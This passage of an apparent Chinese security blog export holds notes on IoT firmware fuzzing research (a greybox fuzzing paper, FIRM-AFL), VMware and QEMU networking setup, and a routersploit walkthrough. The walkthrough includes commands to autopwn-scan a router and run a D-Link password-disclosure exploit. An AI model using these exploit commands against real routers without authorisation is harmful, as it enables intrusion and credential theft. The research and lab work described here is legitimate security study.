            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dir-815</tag>
      </tags>
  </entry>
  <entry>
    <title>An Efficient Greybox Fuzzing Scheme for Linux-based IoT Programs Through Binary Static Analysis</title>
    <url>/2020/04/16/lun-wen-yue-du-bi-ji/</url>
    <content><![CDATA[<p>论文链接：</p>
<p><a href="https://ieeexplore.ieee.org/abstract/document/8958740" target="_blank" rel="noopener">https://ieeexplore.ieee.org/abstract/document/8958740</a> </p>
<p>本文发表在  <a href="https://ieeexplore.ieee.org/xpl/conhome/8955479/proceeding" target="_blank" rel="noopener">2019 IEEE 38th International Performance Computing and Communications Conference (IPCCC)</a> ，第一作者是来自中国科学院大学网络安全学院的郑尧文</p>
<h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>随着物联网技术的普及，IoT设备的安全性受到越来越多人的关注，当前很多IoT设备例如网络摄像头和路由器采用阉割版或者轻微改动的linux内核作为它们的操作系统。由于Linux系统的开源性，很多攻击者对其很熟悉，所以该类型IoT设备如果存在漏洞的话容易被攻击。Fuzzing作为当前最为流行的漏洞挖掘测试技术之一。由于IoT设备的特性（一般无源码，需要特定的运行环境），传统Fuzzing技术无法直接应用于IoT设备程序。</p>
<p>本文提出了一种有效的灰盒模糊测试方案，该方案由两步骤组成：二进制静态分析和IoT程序灰盒模糊测试。二进制静态分析为之后的高效Fuzzing提供有效的输入，IoT程序灰盒模糊测试是基于IoT内核Fuzzer进行改进使其适用于IoT程序。</p>
<p>作者实现了原型系统并且实验结果表明该系统能够发现真实的基于Linux的IoT程序漏洞。</p>
<h1 id="设计与实现"><a href="#设计与实现" class="headerlink" title="设计与实现"></a>设计与实现</h1><p>整个系统分为两个部分：</p>
<h2 id="（1）二进制静态分析"><a href="#（1）二进制静态分析" class="headerlink" title="（1）二进制静态分析"></a>（1）二进制静态分析</h2><p>其中第一第二步是从IoT固件中的目标程序中获取候选的关键字，第三四五六步则是分析程序是如何解析和运行候选关键字，如果候选关键字能够提高代码的覆盖率则将其作为“fuzz keywords”。</p>
<p><img src="%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6.png" alt=""></p>
<p>step1：使用binwalk工具从IoT固件中获取二进制目标程序。</p>
<p>step2：从二进制目标程序的.data和.rodata段中找出所有可读的字符作为候选关键字。</p>
<p>本文使用了污点分析技术，将指向存储可读变量内存地址的指针作为Taint source，将库函数中内存和字符串比较APIs作为Taint sink。</p>
<p>step3：块粒度污点，分析本文将污点分析过程分解为块粒度。构建了一个队列来存储为分析的块，队列中初始块是包含装载当前正在分析的字符串的指令的块。对于每个出队列的块，执行块粒度污点分析。采用了广度优先搜索（<strong>breadth-first-search</strong>）模式。</p>
<p>step4：块转换分析，以确定后继代码块是否进入库函数还是普通代码块，如果是普通代码块则将其加入队列中step3，如果进入了库函数则进入step5。</p>
<p>step5：库函数分析，如果该库函数被定义为Taint sink，则进入step6。否则将根据库函数生成污点流summary完成污点传播分析，并将后继块加入到队列回到step3。</p>
<p>step6：库函数Taint sink分析，判断是否污点分析是否结束。获取step3的污染寄存器以及Taint sink相关寄存器，如果step3的污染寄存器包含在Taint sink相关寄存器中则将当前分析的候选字符串作为fuzz keywords。</p>
<p>库函数生成污点流summary：对库函数进行数据流分析，使用该方法只需要对每个库函数执行一遍库函数分析，而不用像其他普通函数一样进行过程间污点分析。</p>
<p><img src="%E5%BA%93%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7.png" alt=""></p>
<h2 id="（2）IoT程序灰盒Fuzzing"><a href="#（2）IoT程序灰盒Fuzzing" class="headerlink" title="（2）IoT程序灰盒Fuzzing"></a>（2）IoT程序灰盒Fuzzing</h2><p>修改全系统灰盒fuzzer（TriforceAFL）使其支持IoT程序灰盒Fuzzing，因为TriforceAFL在执行过程中缺少实时监控器以及对特定进程的准确代码覆盖率收集，所以对IoT程序的Fuzzing并不支持。本文在原有组件的基础上修改了监控组件使其使用于IoT程序。</p>
<p><img src="IoT%E7%81%B0%E7%9B%92%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6.png" alt=""></p>
<p>（1）工作流程：首先开始IoT固件仿真包括boot操作系统，同时调用一个fuzz驱动。当系统启动完成之后，fuzz驱动会启动AFL fork服务器，该服务器将派生一个子进程并在其中执行后续操作。在子进程中，驱动会从fuzz引擎中获取一个新的输入，将这个输入喂给目标系统调用，当系统调用结束时退出到父进程。</p>
<p>a)fuzz引擎：使用静态分析获得keywords，使其参与输入生成。因为<strong>AFL通过启用- x模式，将keywords作为字典参与输入的生成</strong>。其他的完全遵从AFL的输入生成策略。最开始种子池中仅包含用户提供的输入，fuzz引擎会从中选择一个进行变异生出输入，并将其喂给目标系统调用，随着Fuzzing迭代的进行，那些能够达到新得代码覆盖的输入被存储作为种子池中的新种子。</p>
<p>b)fork模式：工作流程中提到fuzz驱动会启动AFL fork服务器来,并在fork出的虚拟机中进行接下来的一些列操作。这意味着当一个测试用例结束时，Fuzzing进程会回滚到fork点进行下一次迭代。<strong>fork点是网络相关系统调用</strong>，通过hook这些系统调用完成输入feeding。</p>
<p>c)代码覆盖率：对QEMU系统模式中的分支转换进行插桩，更具体的说是在系统调用的每个代码块执行中，使用当前程序计数器(PC)对最后一个代码块的PC进行编码，然后将值存储在fuzz引擎的bitmap中。当系统调用完成时，fuzz引擎会将bitmap与以前的累积bitmap进行比较，确定是否达到新的代码覆盖。</p>
<p> 2）IoT程序的实时监控器</p>
<p>a)进程监控器：作者遍历Linux内核中的任务结构(task structure)来监控进行的开始和结束。当一个新任务开始时，能够得到的任务信息包括：名字，进程号等，如果等于目标程序的名字，监控器则通知fuzzer目标程序启动起来了，可以进行fork和后续操作。同样的当任务信息中的目标程序信息消失，则说明目标程序终止了。</p>
<p>b)系统调用监控：在系统调用异常之后立即插桩并将其标记为系统调用的起始点，同时获得系统调用信息，例如系统调用号。在进入系统调入之前计入当前PC和栈指针，之后在每个代码块的结束点插桩获得PC和栈指针，与之前的记录进行比较，如果相同说明系统调用结束并返回目标进程。本文监控网络相关的系统调用。</p>
<p>c)上下文分析：当一个新的进程创建的时候，操作系统会设置页面全局目录(PGD)，不同进程的PGD不同，所以可以通过PGD来鉴别进程。</p>
<h1 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h1><p>本系统的二进制分析模块是基于IDAPython编写的python代码，Fuzzing模块是基于TriforceAFL进行修改的。系统仿真是借助Firmadyne工具，所以从Firmadyne的数据库中选取了6个固件进行测试。对其中的HTTP服务进行Fuzzing，从中选取了7个http相关的程序。</p>
<p><img src="%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF.png" alt=""></p>
<p>首先对每个IoT程序进行二进制静态分析获取他们的fuzz keywords。然后构造正常的http或者cgi请求作为初始种子进行Fuzzing。</p>
<p>本文随后与AFL和TriforceAFL进行比较（两者开源），同时为了验证本文的设计提高了效率，将fork引擎的fuzz keywords删除，采用随机变异的方式进行实验。为了让实验更让人信服，对每个实验重复进行5次持续24小时。</p>
<p>实验结果表明确实能够发现已存在的漏洞，以及一个未知漏洞。这验证了实验的有效性。同时表明了TriforceAFL和AFL的缺陷。</p>
<p><img src="%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C.png" alt=""></p>
<p>为了证明二进制分析得到的keywords提高了效率，做了以下比较。发现在相同时间内确实能够发现更多的Crash和paths。</p>
<p><img src="%E6%9C%89%E6%95%88%E6%80%A7%E9%AA%8C%E8%AF%81.png" alt=""></p>
<p><img src="path%E5%8F%91%E7%8E%B0%E6%9B%B4%E5%A4%9A.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过对IoT程序进行二进制静态分析得到的keywords确实能够提高模糊测试的效率，同时对TriforceAFL进行相应改进使其适应于IoT程序之后能够更加准确的监控程序运行，从而获取代码覆盖率。</p>
<p>存在的局限性：</p>
<p>1）二进制静态分析：本文定义的Taint sink是uClibc中的字符串和内存比较函数。而有些比较操作可能在二进制文件本身实现，没有调用库函数。还有些厂家使用自己定义的库以及库函数。这些是本文没有考虑到情况。</p>
<p>2）IoT固件仿真：本文的固件仿真是基于Firmadyne进行的，所以CPU架构局限于MIPS小端，MIPS大端和ARM。同时设备类型局限于路由器和摄像头。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>Binary Static Analysis</tag>
        <tag>Greybox Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>FIRM-AFL总结</title>
    <url>/2020/04/08/firm-afl-zong-jie/</url>
    <content><![CDATA[<p>系统模式只是记录fork点，然后以便回滚，以及提供环境变量，将需要的页映射进内存中。</p>
<p>对于AFL改动的地方主要就是FORK的地方。</p>
<p>还有尽管是对busybox fuzz但是在运行的时候会unmap掉这些内存页，将真正fuzz的对象映射进来，这块逻辑体现在了FIRM-AFL/uer_mode/linux-user/main.c中原来的是在afl-2.52b/qemu_mode/qemu-2.10.0/linux-user/main.c中</p>
<p>直接拼接AFL和QEMU系统模式的工具是Triforce-AFL</p>
<p>现在最主要的事，还是找到自己要解决什么问题！工具不是最主要的，主要的还是找问题，解决它，不是结局的很完美也没关系。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
  </entry>
  <entry>
    <title>VM虚拟机ubuntu16.04的网络桥接配置</title>
    <url>/2020/04/07/ubuntu16-04-de-wang-luo-qiao-jie-pei-zhi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么会记录这个过程，因为昨天想起了路由器有个类似与metasploit的工具<a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">routersploit</a>，之前在ubuntu18.04上装过，好像用了出现问题没跑起来。这次在16.04上安装，并结合firmadyne对其进行测试。对于DIR-815仿真起来之后，routersploit能够扫描到其中的一个洞，但是其他的洞没有payload。然后我用routersploit扫描家里TP-link路由器出现问题了，当时我以为虚拟机用NAT模式，导致在192.168.91.0/24网段，但是路由器地址是192.168.0.1。想着配置虚拟机在192.168.0.0/24网段不就行了。我真是个机灵鬼，结果发现并不是这个问题。不过也学习了一波虚拟机网络配置三种模式。</p>
<h1 id="routersploit"><a href="#routersploit" class="headerlink" title="routersploit"></a>routersploit</h1><p>Exploitation Framework for Embedded Devices，针对嵌入式设备的利用框架。具体里面的架构没有仔细研究，目前只停留在使用阶段。使用界面是一个命令交互式界面。目前最新的版本是3.4.1，里面有132个exploits，32个payloads。当然可以自己扩展。</p>
<p><img src="routersploit.png" alt=""></p>
<p>routersploit的使用步骤在github上的一个演示视频中有演示。总结起来：</p>
<h2 id="扫描目标查找当前漏洞库中存在的漏洞"><a href="#扫描目标查找当前漏洞库中存在的漏洞" class="headerlink" title="扫描目标查找当前漏洞库中存在的漏洞"></a>扫描目标查找当前漏洞库中存在的漏洞</h2><pre class=" language-shell"><code class="language-shell">use scanners/autopwn #选择自动扫描模式
set target 192.168.0.1 #设置目标
run</code></pre>
<p><img src="vulnerablity.png" alt=""></p>
<h2 id="显示目标的漏洞，选择exploit"><a href="#显示目标的漏洞，选择exploit" class="headerlink" title="显示目标的漏洞，选择exploit"></a>显示目标的漏洞，选择exploit</h2><pre class=" language-sh"><code class="language-sh">use exploits/routers/dlink/dir_8xx_password_disclosure #选择exploit
set target 192.168.0.1 #设定目标这里需要重新设置不然show options显示目标为空
check #再次检测目标是否存在该漏洞，若存在会显示[+] Target is vulnerable
run</code></pre>
<p>该exploit是泄漏dir_8xx的默认密码。</p>
<p><img src="password_disclosure.png" alt=""></p>
<p>本次仿真的目标是D-LINK DIR-859路由器。</p>
<p><img src="DIR859.png" alt=""></p>
<p>不需要密码就能登陆。</p>
<p><img src="login.png" alt=""></p>
<h2 id="选择攻击载荷"><a href="#选择攻击载荷" class="headerlink" title="选择攻击载荷"></a>选择攻击载荷</h2><pre class=" language-shell"><code class="language-shell">show payloads
set payload xxxx
set lhost 本机ip
run</code></pre>
<p><img src="show_payloads.png" alt=""></p>
<p>但是会在选择攻击载荷的时候会遇到没有Payload的情况，可以自己编写扩展进去。或者根本就利用不起来，下面的情况就是利用不起来。</p>
<h1 id="测试家用实体路由器遇到的问题"><a href="#测试家用实体路由器遇到的问题" class="headerlink" title="测试家用实体路由器遇到的问题"></a>测试家用实体路由器遇到的问题</h1><p>利用routersploit测试TP-Link TL-WR886N型号实体路由器时（web服务器访问地址也是192.168.0.1）</p>
<p><img src="TL-WR886N.png" alt=""></p>
<p>扫描出存在漏洞，但是无法利用。</p>
<p><img src="set_payload.png" alt=""></p>
<p>github该项目上同样有许多人提出这个<a href="https://github.com/threat9/routersploit/issues/550" target="_blank" rel="noopener">issue</a>(Could not set up HTTP server on lhost / can’t transfer payload)。</p>
<p>我想着是哪里出了问题，之前ubuntu虚拟机的ip是利用NAT模式设置的网络，所以IP是192.168.91.0/24网段的，我以为是IP不在一个网段导致的，所以就想着改下IP。就学习了VM虚拟机配置网络的3种方式。以下内容参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
<h1 id="VMware-三种网络工作模式"><a href="#VMware-三种网络工作模式" class="headerlink" title="VMware 三种网络工作模式"></a>VMware 三种网络工作模式</h1><p>vmware为我们提供了三种网络工作模式，它们分别是：<strong>Bridged（桥接模式）</strong>、<strong>NAT（网络地址转换模式）</strong>、<strong>Host-Only（仅主机模式）</strong>。 </p>
<p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式）。其实看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。 </p>
<p><img src="%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8.png" alt=""></p>
<p>同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。 </p>
<p><img src="%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%BD%91%E5%8D%A1.png" alt=""></p>
<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示： </p>
<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
<h3 id="设置桥接模式"><a href="#设置桥接模式" class="headerlink" title="设置桥接模式"></a>设置桥接模式</h3><ol>
<li><p>在物理机上：网络共享中心-&gt;本地连接-&gt;属性-&gt;勾选桥接模式协议 </p>
<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%E5%8D%8F%E8%AE%AE.png" alt=""></p>
</li>
<li><p>在Vmware上 虚拟机-&gt;设置-&gt;网络适配器-&gt;勾选桥接模式 </p>
<p><img src="%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
</li>
<li><p>Vmware 编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;选中桥接模式</p>
<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A11.png" alt=""></p>
<p>（选择好桥接的网卡，我之前选择的自动导致网络无法连接）</p>
<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A1.png" alt=""></p>
</li>
<li><p>进入虚拟机更改网卡配置</p>
<p>物理机IP信息（这张图是别人的图不是我自己的图）</p>
<p><img src="%E7%89%A9%E7%90%86%E6%9C%BAIP%E4%BF%A1%E6%81%AF.png" alt=""></p>
<ul>
<li><p>更改IP</p>
<p><code>sudo vim /etc/network/interfaces</code><strong>注意这个ip的网段（子网）要跟你的物理机是一样的。</strong> （下面的图也是比人的图，可能跟上面那张图不匹配，但是意思没错）</p>
<p><img src="interface.png" alt=""></p>
</li>
<li><p>设置DNS文件</p>
<p><code>sudo vim /etc/resolv.conf</code><strong>DNS服务器一定要一样</strong></p>
<p><img src="DNS%E9%85%8D%E7%BD%AE.png" alt=""></p>
</li>
<li><p>重启网络</p>
<p><code>sudo /etc/init.d/networking restart</code></p>
<p>ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 试试能否成功！</p>
</li>
</ul>
</li>
</ol>
<h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT(网络地址转换)"></a>NAT(网络地址转换)</h2><p>如果你的网络ip资源紧缺，但是又希望虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： </p>
<p><img src="NAT%E6%A8%A1%E5%BC%8F.png" alt=""></p>
<p>在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。此时主机如果卸载掉VMnet8，虚拟机也能连上外网，但是虚拟机无法跟主机通信。*<em>VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。 *</em></p>
<p>而且使用NAT模式时，虚拟机能够访问在同一片局域网（连接同一个路由器）中的其他主机，但是其他主机无法访问虚拟机。像下图（2011年一个博主发的，理解上有点偏差），用这图的意思就是想说，使用Vmnet8虚拟交换机，此时虚拟机可以通过主机访问其他主机，其他主机不能访问虚拟机。其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。</p>
<p><img src="NAT%E6%A8%A1%E5%BC%8F2.png" alt=""></p>
<h2 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h2><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： </p>
<p><img src="%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F1.png" alt=""></p>
<p> 通过上图，可以发现，如果要使得虚拟机能联网，可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。 具体配置可以参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">这篇文章</a></p>
<p>我个人应该不会设置成仅主机模式之后用它来连外网。</p>
<p>最终我将我的一个ubuntu16.04虚拟机配置成桥接模式，让其能够跟统一个局域网中的其他主机互访，让后用routersploit测试还是出现之前的问题。</p>
<p><img src="%E6%B5%8B%E8%AF%95%E5%A4%B1%E8%B4%A5.png" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">https://blog.csdn.net/shuxiao9058/article/details/7051463</a> </p>
<p> <a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
  </entry>
  <entry>
    <title>Linux以及qemu网络配置的学习</title>
    <url>/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/</url>
    <content><![CDATA[<p>最近一直在使用firmadyne仿真固件，因为firmadyne主要还是利用qemu的系统模式加载预先编译好的Linux内核将固件文件系统托起，从而模拟Linux系统的嵌入式设备的运行。在firmadyne推断网络配置之后生成run.sh文件。其中有关配置网卡部分，以便qemu与宿主机进行通信。在复现CVE进行仿真的时候会出现尽管配置好网卡但是无法通信的问题，所以对Linux以及Qemu的网络通信配置进行学习。</p>
<h1 id="Qemu与外部网络通信"><a href="#Qemu与外部网络通信" class="headerlink" title="Qemu与外部网络通信"></a>Qemu与外部网络通信</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>为了使虚拟机能够与外界通信，Qemu需要为虚拟机提供网络设备。命令行上用-net nic为虚拟机创建虚拟机网卡。例如，qemu的命令行选项<code>-net nic,model=pcnet</code> 表示为虚拟机添加一块pcnet型的以太网卡。如果省略model参数则qemu会默认选择一种 e1000 网卡类型。</p>
<p>有了虚拟网络设备，下面的问题是如何用这些设备来联网。每个qemu的运行实例是宿主机中的一个进程，而每个这样的进程中可以虚拟一些VLAN，虚拟机网络设备接入这些VLAN中。当某个VLAN上连接的网络设备发送数据帧，与它在同一个VLAN中的其它网路设备都能接收到数据帧。上面的例子中对虚拟机的pcnet网卡没有指定其连接的VLAN号，那么qemu默认会将该网卡连入vlan0。下面这个例子更具一般性：</p>
<p><code>-net nic,model=pcnet -net nic,model=rtl8139,vlan=1, -net nic,model=ne2k_pci,vlan=1</code></p>
<p>该命令为虚拟机创建了三块网卡，其中第一块网卡类型是pcnet，连入vlan0；第二块网卡类型是 rtl8139，第三块网卡类型是ne2k_pci，这两块都连入vlan1，所以第二块网卡与第三块网卡可以互相通信，但它们与第一块网卡不能直接通信。 </p>
<p>各个VLAN通过qemu提供的4种通信方式与外界联网：</p>
<p>使用用户模式的客户机可以连通宿主机及外部网络。用户模式网络完全由QEMU模拟实现整个TCP/IP协议栈，并且使用这个协议栈提供一个虚拟的NAT网络。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。</p>
<ol>
<li><p>User mode stack：使用用户模式的客户机可以连通宿主机及外部网络，外部网络不能主动与虚拟机通信。这种方式<strong>由QEMU实现整个TCP/IP协议栈</strong>，并且使用这个协议栈提供一个<strong>虚拟的NAT网络</strong>。负责在虚拟机VLAN和外部网络之间转发数据。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。当然，用户模式网络的缺陷也是明显的：<strong>因其在QEMU内部实现所有网络协议栈，相对性能较差。</strong> 虚拟机VLAN中的各个网络接口只能置于<strong>10.0.2.0</strong>子网中，此外，可以用<code>-redir</code>选项为宿主机和虚拟机的两个TCP或UDP端口建立映射，实现宿主机和虚拟机在特殊要求下的通信（例如X-server或ssh）。<strong>这种方式实现虚拟机上网很简单，类似vmware里的nat,qemu启动时加入-net user选项，虚拟机里使用dhcp方式， (如果没有指定<code>-net xx</code>这是默认配置)。</strong></p>
</li>
<li><p>socket：这种方式又分为TCP和UDP两种类型。<br>（1）TCP：为一个VLAN创建一个套接字，让该套接字在指定的TCP端口上监听，而其他VLAN连接到该套接字上，从而将多个VLAN连接起来。缺点在于<strong>如果监听套接字所在qemu进程崩溃，整个连接就无法工作</strong>。监听套接字所在VLAN通过<code>-net socket,listen</code>选项启用，其他VLAN通过<code>-net socket,connect</code>选项启用。<br>（2）UDP：所有VLAN连接到一个多播套接字上，从而使多个VLAN通过一个总线通信。所有VLAN都通过<code>-net socket,mcast</code>选项启用。</p>
<p>通过参数<code>-netdev socket</code> (或<code>-nic socket</code>或<code>-net socket</code>) 可以实现多个虚拟机之间的互联。 </p>
</li>
<li><p>TAP：这种方式首先需要在宿主机中创建并配置<strong>一个TAP设备</strong>，qemu进程将该TAP设备连接到虚拟机VLAN中。其次，为了实现虚拟机与外部网络的通信，在宿主机中通常还要<strong>创建并配置一个网桥</strong>，并将宿主机的网络接口（通常是eth0）作为<strong>该网桥的一个接口</strong>。最后，只要将<strong>TAP设备作为网桥的另一个接口</strong>，虚拟机VLAN<strong>通过TAP设备</strong>就可以与外部网络完全通信了。这是因为，宿主机的eth0接口作为网桥的接口，与外部网络连接；TAP设备作为网桥的另一个接口，与虚拟机VLAN连接，这样两个网络就连通了。此时，网桥在这两个网络之间转发数据帧。<br>这里有两个问题需要注意：<br>（1）网桥的转发工作需要得到内核的支持，所以在编译宿主机内核时需要选择与桥接相关的配置选项。<br>（2）<strong>当宿主机eth0接口作为网桥接口时，不能为其配置IP地址，而要将IP地址配置给网桥。</strong><br>TAP方式由<code>-net tap</code>选项启用。</p>
</li>
<li><p>VDE：这种方式首先要启动一个VDE进程，该进程打开一个TAP设备，然后各个虚拟机VLAN与VDE进程连接，这样各个VLAN就可以通过TAP设备连接起来。VDE进程通过执行<code>vde_switch</code>命令启动，各个VLAN所在qemu进程通过执行<code>veqe</code>命令启动，这些VLAN就可以与VDE进程连接了。</p>
<p>以上四种通信方式中，socket方式和VDE方式用于虚拟机VLAN之间的连接，而user mode stack方式与外部网路的通信比较有限，<strong>Firmadyne中也是利用TAP方式配置qemu网络</strong>，所以下面主要讨论TAP方式的配置。 </p>
</li>
</ol>
<h2 id="qemu网络配置（TAP方式）"><a href="#qemu网络配置（TAP方式）" class="headerlink" title="qemu网络配置（TAP方式）"></a>qemu网络配置（TAP方式）</h2><p>参照 <a href="https://zh.wikipedia.org/wiki/TUN与TAP" target="_blank" rel="noopener">wiki</a> 对TAP/TUN介绍。<strong>TUN/TAP是操作系统内核支持的网络虚拟设备</strong>，这种网络设备完全由的软件实现。与网络硬件设备不同，TUN/TAP负责<strong>在内核协议栈与用户进程之间传送协议数据单元</strong>。TUN与TAP的区别在于，TUN工作在网络层，而TAP则工作在数据链路层。具体在运行TCP/IP的以太网中，TUN与应用程序交换IP包，而TAP与应用程序交换以太帧。所以TUN通常涉及路由，而TAP则常用于网络桥接。TUN/TAP的典型应用包括：虚拟私有网络OpenVPN、OpenSSH 以及虚拟机器QEMU、KVM。 </p>
<h3 id="具体配置过程"><a href="#具体配置过程" class="headerlink" title="具体配置过程"></a>具体配置过程</h3><ol>
<li><p>首先确定你的机器支持 TAP/TUN 虚拟设备</p>
</li>
<li><p>安装两个配置网络所需软件包： </p>
<pre class=" language-sh"><code class="language-sh">apt-get install bridge-utils        # 虚拟网桥工具
apt-get install uml-utilities       # UML（User-mode linux）工具</code></pre>
</li>
<li><p>配置虚拟网桥的操作（假设系统启动后eth0已经启动，并且从DHCP获得IP地址）</p>
<p>一次性操作，每次重启失效。最好写一个脚本，重启之后可以批处理。</p>
<pre class=" language-sh"><code class="language-sh">ifconfig &lt;你的网卡名称(能上网的那张)&gt; down    # 首先关闭宿主机网卡接口
brctl addbr br0                     # 添加一座名为 br0 的网桥
brctl addif br0 &lt;你的网卡名称&gt;        # 在 br0 中添加一个接口
brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
brctl setfd br0 1                   # 设置 br0 的转发延迟
brctl sethello br0 1                # 设置 br0 的 hello 时间
ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口
ifconfig &lt;你的网卡名称&gt; 0.0.0.0 promisc up    # 启用网卡接口，作为网桥的一端
dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址
brctl show br0                      # 查看虚拟网桥列表
brctl showstp br0                   # 查看 br0 的各接口信息

#在没有dhcp服务器的网络中也可以用ifconfig命令为br0接口配置一个静态IP地址：
ifconfig br0 192.168.0.22 netmask 255.255.255.0
